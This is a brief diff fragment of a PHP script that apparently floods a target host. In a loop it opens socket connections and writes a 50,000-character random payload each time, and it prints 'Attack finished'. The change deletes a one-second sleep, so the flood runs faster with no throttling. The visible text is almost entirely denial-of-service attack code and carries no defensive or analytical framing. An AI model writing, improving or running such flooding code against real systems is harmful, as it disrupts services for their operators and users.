@@ -22,7 +22,6 @@ for ($i = 0; $i < $time; $i++) {
     socket_connect($socket, $host, $port);
     socket_write($socket, makeid(50000));
     socket_close($socket);
-    sleep(1);
 }
 
 echo "Attack finished\n";
